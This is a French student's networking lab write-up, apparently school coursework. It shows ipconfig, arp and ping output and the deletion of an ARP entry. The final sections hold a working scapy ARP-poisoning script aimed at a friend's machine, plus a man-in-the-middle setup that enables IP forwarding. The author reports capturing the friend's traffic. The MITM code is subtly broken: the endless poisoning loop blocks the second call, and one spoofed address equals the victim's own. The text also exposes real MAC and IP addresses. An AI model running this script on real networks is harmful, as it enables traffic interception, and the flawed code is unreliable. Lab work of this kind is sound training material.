☀️ Avant de continuer...

```
PS C:\Users\doria> ipconfig /all | Select-String "Carte réseau sans fil Wi-Fi " -Context 0,5

> Carte réseau sans fil Wi-Fi :

     Suffixe DNS propre à la connexion. . . :
     Description. . . . . . . . . . . . . . : MediaTek Wi-Fi 6 MT7921 Wireless LAN Card
     Adresse physique . . . . . . . . . . . : 14-5A-FC-7F-13-93
     DHCP activé. . . . . . . . . . . . . . : Oui
```

☀️ Affichez votre table ARP

```
S C:\Users\doria> arp -a

Interface : 192.168.56.1 --- 0xd
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.132.178       01-00-5e-7f-84-b2     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 10.33.77.157 --- 0x15
  Adresse Internet      Adresse physique      Type
  10.33.65.63           44-af-28-c3-6a-9f     dynamique
  10.33.79.254          7c-5a-1c-d3-d8-76     dynamique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.132.178       01-00-5e-7f-84-b2     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique

Interface : 172.19.80.1 --- 0x3a
  Adresse Internet      Adresse physique      Type
  172.19.80.144         00-15-5d-89-c8-b3     dynamique
  172.19.95.255         ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  224.0.2.3             01-00-5e-00-02-03     statique
  224.0.2.60            01-00-5e-00-02-3c     statique
  224.76.78.75          01-00-5e-4c-4e-4b     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.132.178       01-00-5e-7f-84-b2     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  239.255.255.253       01-00-5e-7f-ff-fd     statique
```

☀️ Déterminez l'adresse MAC de la passerelle du réseau de l'école

```
10.33.79.254          7c-5a-1c-d3-d8-76

Donc l'adresse MAC de la passerelle est : 7c-5a-1c-d3-d8-76
```

☀️ Supprimez la ligne qui concerne la passerelle / ☀️ Prouvez que vous avez supprimé la ligne dans la table ARP

```
PS C:\WINDOWS\system32> arp -a

Interface : 192.168.56.1 --- 0xd
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.132.178       01-00-5e-7f-84-b2     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 10.33.77.157 --- 0x15
  Adresse Internet      Adresse physique      Type
  10.33.65.63           44-af-28-c3-6a-9f     dynamique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.132.178       01-00-5e-7f-84-b2     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique

Interface : 172.19.80.1 --- 0x3a
  Adresse Internet      Adresse physique      Type
  172.19.80.144         00-15-5d-89-c8-b3     dynamique
  172.19.95.255         ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  224.0.2.3             01-00-5e-00-02-03     statique
  224.0.2.60            01-00-5e-00-02-3c     statique
  224.76.78.75          01-00-5e-4c-4e-4b     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.132.178       01-00-5e-7f-84-b2     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  239.255.255.253       01-00-5e-7f-ff-fd     statique
```

☀️ Déterminer

```
PS C:\Users\doria> ipconfig /all | Select-String "Carte réseau sans fil Wi-Fi " -Context 0,10

> Carte réseau sans fil Wi-Fi :

     Suffixe DNS propre à la connexion. . . :
     Description. . . . . . . . . . . . . . : MediaTek Wi-Fi 6 MT7921 Wireless LAN Card
     Adresse physique . . . . . . . . . . . : 14-5A-FC-7F-13-93
     DHCP activé. . . . . . . . . . . . . . : Oui
     Configuration automatique activée. . . : Oui
     Adresse IPv6. . . . . . . . . . . . . .: 2a01:cb1a:19:5f2:85e8:cca4:bb5f:76fc(préféré)
     Adresse IPv6 temporaire . . . . . . . .: 2a01:cb1a:19:5f2:b160:bac6:22ae:b5b1(préféré)
     Adresse IPv6 de liaison locale. . . . .: fe80::9999:d1b5:dbf0:97b3%21(préféré)
     Adresse IPv4. . . . . . . . . . . . . .: 172.20.10.9(préféré)

Adresse IP: 172.20.10.9 / Adresse MAC : 14-5A-FC-7F-13-93
```

☀️ DIY

```
PS C:\Users\doria> ipconfig /all | Select-String "Carte réseau sans fil Wi-Fi " -Context 0,10

Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Description. . . . . . . . . . . . . . : MediaTek Wi-Fi 6 MT7921 Wireless LAN Card
   Adresse physique . . . . . . . . . . . : 14-5A-FC-7F-13-93
   DHCP activé. . . . . . . . . . . . . . : Oui
   Configuration automatique activée. . . : Oui
   Adresse IPv6. . . . . . . . . . . . . .: 2a02:8440:6440:373b:4066:6cb3:d02:56c1(préféré)
   Adresse IPv6 temporaire . . . . . . . .: 2a02:8440:6440:373b:7866:390f:af6e:102c(préféré)
   Adresse IPv6 de liaison locale. . . . .: fe80::9999:d1b5:dbf0:97b3%21(préféré)
   Adresse IPv4. . . . . . . . . . . . . .: 192.168.11.143(préféré)

Adresse IP : 192.168.11.143 / Adresse MAC : 14-5A-FC-7F-13-93


PS C:\Users\doria> ipconfig /all | Select-String "Carte réseau sans fil Wi-Fi " -Context 0,10

> Carte réseau sans fil Wi-Fi :

     Suffixe DNS propre à la connexion. . . :
     Description. . . . . . . . . . . . . . : MediaTek Wi-Fi 6 MT7921 Wireless LAN Card
     Adresse physique . . . . . . . . . . . : 14-5A-FC-7F-13-93
     DHCP activé. . . . . . . . . . . . . . : Non
     Configuration automatique activée. . . : Oui
     Adresse IPv6. . . . . . . . . . . . . .: 2a02:8440:6440:373b:4066:6cb3:d02:56c1(préféré)
     Adresse IPv6 temporaire . . . . . . . .: 2a02:8440:6440:373b:7866:390f:af6e:102c(préféré)
     Adresse IPv6 de liaison locale. . . . .: fe80::9999:d1b5:dbf0:97b3%21(préféré)
     Adresse IPv4. . . . . . . . . . . . . .: 192.168.11.30(préféré)


PS C:\Users\doria> ping 192.168.11.69

Envoi d’une requête 'Ping'  192.168.11.69 avec 32 octets de données :
Réponse de 192.168.11.69 : octets=32 temps=204 ms TTL=64
Réponse de 192.168.11.69 : octets=32 temps=420 ms TTL=64
Réponse de 192.168.11.69 : octets=32 temps=20 ms TTL=64
Réponse de 192.168.11.69 : octets=32 temps=37 ms TTL=64

PS C:\Users\doria> ping 192.168.11.7

Envoi d’une requête 'Ping'  192.168.11.7 avec 32 octets de données :
Réponse de 192.168.11.7 : octets=32 temps=107 ms TTL=128
Réponse de 192.168.11.7 : octets=32 temps=18 ms TTL=128
Réponse de 192.168.11.7 : octets=32 temps=3 ms TTL=128
Réponse de 192.168.11.7 : octets=32 temps=17 ms TTL=128

PS C:\Users\doria> ping 192.168.11.13

Envoi d’une requête 'Ping'  192.168.11.13 avec 32 octets de données :
Réponse de 192.168.11.13 : octets=32 temps=46 ms TTL=128
Réponse de 192.168.11.13 : octets=32 temps=6 ms TTL=128
Réponse de 192.168.11.13 : octets=32 temps=17 ms TTL=128
Réponse de 192.168.11.13 : octets=32 temps=20 ms TTL=128

PS C:\Users\doria> ping google.com

Envoi d’une requête 'ping' sur google.com [2a00:1450:4007:806::200e] avec 32 octets de données :
Réponse de 2a00:1450:4007:806::200e : temps=56 ms
Réponse de 2a00:1450:4007:806::200e : temps=47 ms
Réponse de 2a00:1450:4007:806::200e : temps=58 ms
Réponse de 2a00:1450:4007:806::200e : temps=147 ms
```

☀️ Affichez votre table ARP !

```
PS C:\Users\doria> arp -a


Interface : 192.168.11.30 --- 0x15
  Adresse Internet      Adresse physique      Type
  192.168.11.7          34-c9-3d-22-97-2d     dynamique
  192.168.11.13         58-cd-c9-60-e5-fb     dynamique
  192.168.11.46         96-24-c9-47-ee-dc     dynamique
  192.168.11.47         58-cd-c9-60-e5-fb     dynamique
  192.168.11.69         90-e8-68-15-ac-43     dynamique
  192.168.11.211        b8-1e-a4-6c-56-97     dynamique
  192.168.11.228        90-e8-68-15-ac-43     dynamique
  192.168.11.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique
```

⭐ Empoisonner la table ARP de l'un des membres de votre réseau

```
from scapy.all import ARP, Ether, sendp, conf, getmacbyip

def arp_poison(victim_ip, victim_mac, router_ip):
    # Get your own MAC address (attacker's MAC)
    attacker_mac = "14:5A:FC:7F:13:93"
    
    # Create an Ethernet frame with the destination MAC as the victim's MAC
    ethernet = Ether(dst=victim_mac)
    
    # Create an ARP response saying that your MAC address (attacker_mac) is the router (router_ip)
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=attacker_mac, op='is-at')
    
    # Combine the Ethernet frame and the ARP response
    packet = ethernet / arp_response

    # Send the ARP response packet in a loop to keep poisoning the victim's ARP cache
    while True:
        sendp(packet, verbose=0)


target_ip = "192.168.11.69"  # IP of the victim
target_mac = "90:e8:68:15:ac:43"  # MAC of the victim
spoof_ip = "192.168.11.46"  # IP you want to spoof (usually the gateway)

La table ARP de mon pote :
192.168.11.46 dev wlo1 lladdr 14:5a:fc:7f:13:93 REACHABLE

Preuve que c'est mon MAC :
Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Description. . . . . . . . . . . . . . : MediaTek Wi-Fi 6 MT7921 Wireless LAN Card
   Adresse physique . . . . . . . . . . . : 14-5A-FC-7F-13-93
```

⭐ Mettre en place un MITM

```
On rajoute ça à la fin : 

target_ip2 = "192.168.11.46"  # IP of the victim
target_mac2 = "96-24-c9-47-ee-dc"  # MAC of the victim
spoof_ip2 = "192.168.11.46"  # IP you want to spoof (usually the gateway)

arp_poison(target_ip, target_mac, spoof_ip)
arp_poison(target_ip2, target_mac2, spoof_ip2)

En faisant : netsh interface ipv4 set interface "Wi-Fi" forwarding=enabled
Je reçois bien ses requêtes TCP et il peut se connecter à des sites internet
```